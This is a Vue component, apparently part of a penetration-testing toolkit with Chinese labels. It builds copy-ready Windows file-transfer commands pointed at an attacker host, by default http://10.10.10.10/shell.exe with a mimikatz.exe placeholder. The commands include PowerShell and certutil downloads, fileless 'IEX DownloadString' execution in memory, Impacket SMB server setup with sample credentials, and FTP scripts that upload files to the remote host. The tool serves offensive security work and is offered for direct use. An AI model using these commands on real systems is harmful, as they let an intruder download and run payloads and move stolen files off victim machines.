<template>
  <div class="space-y-4">
    <div class="grid grid-cols-2 gap-3">
      <div>
        <label class="text-xs font-medium block mb-1" style="color: var(--color-text-secondary);">远程文件 URL</label>
        <input
          v-model="targetUrl"
          type="text"
          placeholder="http://10.10.10.10/mimikatz.exe"
          class="w-full rounded-md border px-3 py-2 text-sm font-mono focus:outline-none"
          style="background-color: var(--color-bg-secondary); border-color: var(--color-border); color: var(--color-text);"
        />
      </div>
      <div>
        <label class="text-xs font-medium block mb-1" style="color: var(--color-text-secondary);">输出文件名</label>
        <input
          v-model="outputFile"
          type="text"
          placeholder="mimikatz.exe"
          class="w-full rounded-md border px-3 py-2 text-sm font-mono focus:outline-none"
          style="background-color: var(--color-bg-secondary); border-color: var(--color-border); color: var(--color-text);"
        />
      </div>
    </div>

    <TabView :tabs="categories">
      <template #tab-0>
        <!-- PowerShell 下载 -->
        <div class="space-y-3">
          <div v-for="(item, idx) in psDownloadCommands" :key="idx"
            class="rounded-md border p-3"
            style="border-color: var(--color-border); background-color: var(--color-bg-secondary);"
          >
            <div class="flex items-center justify-between gap-2 mb-1">
              <span class="text-sm font-medium" style="color: var(--color-text);">{{ item.title }}</span>
              <CopyButton :text="item.command" />
            </div>
            <pre class="text-xs font-mono overflow-x-auto p-2 rounded" style="background-color: var(--color-bg-tertiary); color: var(--color-text); white-space: pre-wrap; word-break: break-all;">{{ item.command }}</pre>
            <p v-if="item.desc" class="text-xs mt-1" style="color: var(--color-text-muted);">{{ item.desc }}</p>
          </div>
        </div>
      </template>

      <template #tab-1>
        <!-- PowerShell 无文件 -->
        <div class="space-y-3">
          <p class="text-xs" style="color: var(--color-text-muted);">
            无文件攻击直接在内存中执行 Payload，无需写入磁盘。使用 <code style="color: var(--color-text);">Invoke-Expression</code> 或别名 <code style="color: var(--color-text);">IEX</code>。
          </p>
          <div v-for="(item, idx) in filelessCommands" :key="idx"
            class="rounded-md border p-3"
            style="border-color: var(--color-border); background-color: var(--color-bg-secondary);"
          >
            <div class="flex items-center justify-between gap-2 mb-1">
              <span class="text-sm font-medium" style="color: var(--color-text);">{{ item.title }}</span>
              <CopyButton :text="item.command" />
            </div>
            <pre class="text-xs font-mono overflow-x-auto p-2 rounded" style="background-color: var(--color-bg-tertiary); color: var(--color-text); white-space: pre-wrap; word-break: break-all;">{{ item.command }}</pre>
          </div>
        </div>
      </template>

      <template #tab-2>
        <!-- SMB 传输 -->
        <div class="space-y-3">
          <p class="text-xs" style="color: var(--color-text-muted);">
            SMB 协议运行在 <strong>TCP/445</strong> 端口，常见于企业 Windows 网络。
          </p>
          <div v-for="(item, idx) in smbCommands" :key="idx"
            class="rounded-md border p-3"
            style="border-color: var(--color-border); background-color: var(--color-bg-secondary);"
          >
            <div class="flex items-center justify-between gap-2 mb-1">
              <span class="text-sm font-medium" style="color: var(--color-text);">{{ item.title }}</span>
              <CopyButton :text="item.command" />
            </div>
            <pre class="text-xs font-mono overflow-x-auto p-2 rounded" style="background-color: var(--color-bg-tertiary); color: var(--color-text); white-space: pre-wrap; word-break: break-all;">{{ item.command }}</pre>
            <p v-if="item.desc" class="text-xs mt-1" style="color: var(--color-text-muted);">{{ item.desc }}</p>
          </div>
        </div>
      </template>

      <template #tab-3>
        <!-- FTP 传输 -->
        <div class="space-y-3">
          <h4 class="text-sm font-medium" style="color: var(--color-text);">FTP 下载</h4>
          <div class="rounded-md border p-3" style="border-color: var(--color-border); background-color: var(--color-bg-secondary);">
            <p class="text-xs mb-2" style="color: var(--color-text-muted);">启动 FTP 服务器：</p>
            <div class="flex items-center gap-2">
              <pre class="flex-1 text-xs font-mono p-2 rounded" style="background-color: var(--color-bg-tertiary); color: var(--color-text);">sudo python3 -m pyftpdlib --port 21</pre>
              <CopyButton text="sudo python3 -m pyftpdlib --port 21" />
            </div>
          </div>

          <div v-for="(item, idx) in ftpCommands" :key="idx"
            class="rounded-md border p-3"
            style="border-color: var(--color-border); background-color: var(--color-bg-secondary);"
          >
            <div class="flex items-center justify-between gap-2 mb-1">
              <span class="text-sm font-medium" style="color: var(--color-text);">{{ item.title }}</span>
              <CopyButton :text="item.command" />
            </div>
            <pre class="text-xs font-mono overflow-x-auto p-2 rounded" style="background-color: var(--color-bg-tertiary); color: var(--color-text); white-space: pre-wrap; word-break: break-all;">{{ item.command }}</pre>
          </div>

          <h4 class="text-sm font-medium mt-4" style="color: var(--color-text);">FTP 上传</h4>
          <div class="rounded-md border p-3" style="border-color: var(--color-border); background-color: var(--color-bg-secondary);">
            <p class="text-xs mb-2" style="color: var(--color-text-muted);">启动 FTP 服务器（允许写入）：</p>
            <div class="flex items-center gap-2">
              <pre class="flex-1 text-xs font-mono p-2 rounded" style="background-color: var(--color-bg-tertiary); color: var(--color-text);">sudo python3 -m pyftpdlib --port 21 --write</pre>
              <CopyButton text="sudo python3 -m pyftpdlib --port 21 --write" />
            </div>
          </div>

          <div v-for="(item, idx) in ftpUploadCommands" :key="'up-'+idx"
            class="rounded-md border p-3"
            style="border-color: var(--color-border); background-color: var(--color-bg-secondary);"
          >
            <div class="flex items-center justify-between gap-2 mb-1">
              <span class="text-sm font-medium" style="color: var(--color-text);">{{ item.title }}</span>
              <CopyButton :text="item.command" />
            </div>
            <pre class="text-xs font-mono overflow-x-auto p-2 rounded" style="background-color: var(--color-bg-tertiary); color: var(--color-text); white-space: pre-wrap; word-break: break-all;">{{ item.command }}</pre>
          </div>
        </div>
      </template>
    </TabView>
  </div>
</template>

<script setup lang="ts">
import { ref, computed } from 'vue';
import TabView from '../../common/TabView.vue';
import CopyButton from '../../common/CopyButton.vue';

const targetUrl = ref('http://10.10.10.10/shell.exe');
const outputFile = ref('shell.exe');

const categories = ['PowerShell 下载', '无文件执行', 'SMB 传输', 'FTP 传输'];

const psDownloadCommands = computed(() => [
  { title: 'Net.WebClient.DownloadFile', command: `(New-Object Net.WebClient).DownloadFile('${targetUrl.value}','${outputFile.value}')`, desc: '使用 WebClient 下载文件' },
  { title: 'Net.WebClient.DownloadFileAsync', command: `(New-Object Net.WebClient).DownloadFileAsync('${targetUrl.value}','${outputFile.value}')`, desc: '异步下载文件' },
  { title: 'Invoke-WebRequest', command: `Invoke-WebRequest -Uri '${targetUrl.value}' -OutFile '${outputFile.value}'`, desc: 'PowerShell 3.0+，速度较慢但功能全面' },
  { title: 'IWR (别名)', command: `iwr -Uri '${targetUrl.value}' -OutFile '${outputFile.value}'`, desc: 'Invoke-WebRequest 的简写' },
  { title: 'Certutil', command: `certutil -urlcache -f ${targetUrl.value} ${outputFile.value}`, desc: 'CMD 兼容的证书工具下载' },
]);

const filelessCommands = computed(() => [
  { title: 'IEX + DownloadString', command: `IEX (New-Object Net.WebClient).DownloadString('${targetUrl.value}')` },
  { title: 'DownloadString + Pipe', command: `(New-Object Net.WebClient).DownloadString('${targetUrl.value}') | IEX` },
]);

const smbCommands = computed(() => {
  const ipFromUrl = targetUrl.value.match(/\/\/([^/]+)/)?.[1] || '10.10.10.10';
  return [
    { title: '启动 SMB 服务器', command: 'sudo impacket-smbserver share -smb2support /tmp/smb_share', desc: '在攻击机上使用 Impacket 启动 SMB 服务器' },
    { title: '从 SMB 复制文件', command: `copy \\\\${ipFromUrl}\\${outputFile.value}` },
    { title: '启动带认证的 SMB 服务器', command: 'sudo impacket-smbserver share -smb2support /tmp/smbshare -user johnDoe -password Sup3rP@ssw0rd!', desc: '新版 Windows 阻止未认证的访客访问' },
    { title: '挂载带密码的 SMB 共享', command: `net use z: \\\\${ipFromUrl}\\share /user:johnDoe Sup3rP@ssw0rd!` },
  ];
});

const ftpCommands = computed(() => {
  const ipFromUrl = targetUrl.value.match(/\/\/([^/]+)/)?.[1] || '10.10.10.10';
  return [
    { title: 'PowerShell FTP 下载', command: `(New-Object System.Net.WebClient).DownloadFile('ftp://${ipFromUrl}/${outputFile.value}','${outputFile.value}')` },
    { title: 'CMD FTP 脚本', command: `echo open ${ipFromUrl} 21 > ftp.txt\necho USER anonymous >> ftp.txt\necho GET ${outputFile.value} >> ftp.txt\necho BYE >> ftp.txt\nftp -v -s:ftp.txt` },
  ];
});

const ftpUploadCommands = computed(() => {
  const ipFromUrl = targetUrl.value.match(/\/\/([^/]+)/)?.[1] || '10.10.10.10';
  return [
    { title: 'PowerShell FTP 上传', command: `(New-Object System.Net.WebClient).UploadFile('ftp://${ipFromUrl}/${outputFile.value}','C:\\Users\\Public\\${outputFile.value}')` },
    { title: 'CMD FTP 上传脚本', command: `echo open ${ipFromUrl} 21 > ftp.txt\necho USER anonymous >> ftp.txt\necho binary >> ftp.txt\necho PUT ${outputFile.value} >> ftp.txt\necho BYE >> ftp.txt\nftp -v -s:ftp.txt` },
  ];
});
</script>
